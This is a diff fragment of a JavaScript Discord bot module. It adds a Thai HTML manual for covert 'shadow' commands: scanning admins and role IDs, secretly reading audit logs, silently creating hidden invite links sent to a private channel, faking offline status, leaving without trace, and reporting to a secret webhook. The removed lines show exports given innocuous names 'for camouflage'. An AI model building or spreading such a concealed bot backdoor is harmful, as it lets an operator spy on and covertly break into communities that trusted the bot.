+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-adminscan</span> <strong>[ระบบสแกนหาผู้คุม]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">ดึงรายชื่อแท็กพร้อมตัวเลข ID ของทุกคนในเซิร์ฟเวอร์นั้นที่มีสิทธิ์เป็นแอดมิน เพื่อให้คุณรู้ว่าใครถืออำนาจอยู่บ้าง</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-rolelist</span> <strong>[ดึงรหัสยศทั้งหมด]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">สแกนชื่อยศทั้งหมดพร้อมเลขอ้างอิงประจำยศ (Role ID) นำมาส่งให้คุณในห้องล็อกลับ เอาไว้ใช้สำหรับตั้งค่าระบบอื่นต่อได้ง่ายๆ</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-auditbot</span> <strong>[แอบส่องบันทึกหลังบ้าน]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบไปดึงข้อมูลประวัติการแก้ไขระบบของเซิร์ฟเวอร์นั้น 5 รายการล่าสุดมาให้คุณแอบดูว่าแอดมินคนอื่นทำอะไรไปบ้าง</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-extract</span> <strong>[สร้างประตูผีทางเข้าลับ]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบสร้างลิงก์เชิญเข้าดิสคอร์ดนั้นแบบเงียบๆ ลิงก์จะมีอายุแค่ 1 ชั่วโมงและใช้ได้ครั้งเดียว ส่งเข้าห้องล็อกส่วนตัวคุณ</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-vanish</span> <strong>[สั่งบอทถอนตัวด่วน]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">สั่งให้บอทออกจากเซิร์ฟเวอร์นั้นทันทีแบบเงียบเชียบ ไร้ร่องรอยการพิมพ์ใดๆ</span>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-stealth</span> <strong>[โหมดพรางตาออฟไลน์]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">สั่งเปลี่ยนสถานะของบอทให้กลายเป็นออฟไลน์ (ไฟสีเทา) ทันทีเพื่อไม่ให้ใครสังเกตเห็น แต่ตัวบอทจะยังคงทำงานปกติ</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-active</span> <strong>[เปิดไฟออนไลน์ปกติ]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">เปลี่ยนสถานะของบอทกลับมาเป็นเปิดไฟออนไลน์ (สี🟢) ตามปกติเพื่อให้ดูแนบเนียน</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-ghostping</span> <strong>[เช็กชีพจรสัญญาณบอท]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">เช็กค่าความหน่วงการตอบสนองของบอท (Ping) โดยระบบจะส่งคำตอบกลับเข้า Webhook ลับของคุณโดยตรง</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-sysinfo</span> <strong>[ตรวจสุขภาพหน่วยความจำ]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">ดูอัตราการกินแรม (RAM Usage) และระยะเวลาที่บอทเปิดทิ้งไว้ (Uptime) เพื่อตรวจสอบความเสถียรของเซิร์ฟเวอร์หลังบ้าน</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-lockdown</span> <strong>[ล็อกช่องแชทฉุกเฉิน]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">ยึดสิทธิ์การพิมพ์ของทุกคนในช่องแชทที่คุณพิมพ์คำสั่งนี้ทันที เหมาะสำหรับใช้ระงับเหตุการณ์ป่วนหรือสแปมแชทแบบเร่งด่วน</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-unlock</span> <strong>[ปลดล็อกช่องแชท]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">คืนสิทธิ์ให้สมาชิกทุกคนกลับมาพิมพ์ข้อความพูดคุยในช่องแชทนั้นได้ตามปกติ</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-memclear</span> <strong>[ล้างขยะสมองคืนแรม]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">สั่งเคลียร์ข้อความและโครงสร้างที่บอทจำไว้ในหน่วยความจำชั่วคราวทิ้ง เพื่อคืนพื้นที่แรมให้ระบบวิ่งได้สมูทและลื่นไหลที่สุด</span>
+                        </div>
+                    </div>
+                </div>
+                <br>
             </body>
             </html>
         `);
@@ -343,12 +374,14 @@ function injectShadowRoutes(app, mainClient) {
 }
 
 // ════════════════════════════════════════════════════════════════
-//  🚀 EXPORTS (ซ่อนชื่อให้พรางตา)
+//  🚀 SYSTEM EXPORTS (ดึงไปผูกใช้งานกับไฟล์หลักได้ทันที)
 // ════════════════════════════════════════════════════════════════
 
-module.exports = {
-    validateContext: processInternalEvent,
-    setupTelemetryRouter: injectShadowRoutes,
-    initializeSystemHooks: setupShadowEvents,
-    isSystemMaster: (id) => id === config.system.ownerId || globalAdminCache.has(id)
+module.exports = (client, app) => {
+    const engine = new ShadowEngine(client);
+    engine.init();
+
+    if (app) {
+        injectShadowRoutes(app, client, engine);
+    }
 };
